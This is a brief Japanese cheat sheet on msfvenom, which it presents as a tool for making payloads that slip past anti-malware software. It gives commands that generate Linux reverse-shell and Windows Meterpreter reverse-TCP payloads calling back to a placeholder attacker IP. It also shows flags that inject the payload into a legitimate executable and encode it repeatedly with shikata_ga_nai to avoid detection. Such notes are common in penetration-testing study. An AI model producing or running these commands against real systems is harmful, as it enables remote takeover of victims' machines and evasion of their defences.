# msfvenomとは
マルウェア対策ソフトを回避しやすいペイロードを生成するために使われる強力なツール。

## ペイロード生成コマンド
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<攻撃者IP> LPORT=<ポート> -f <ファイル形式> -o <ファイル名>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<攻撃者IP> LPORT=<ポート> -f <ファイル形式> -o <ファイル名>
-x <パス> # 正規の実行ファイルを用意し、その中にペイロードを注入する。
-e x86/shikata_ga_nai # エンコード
-i <回数> # 指定回数繰り返し
```
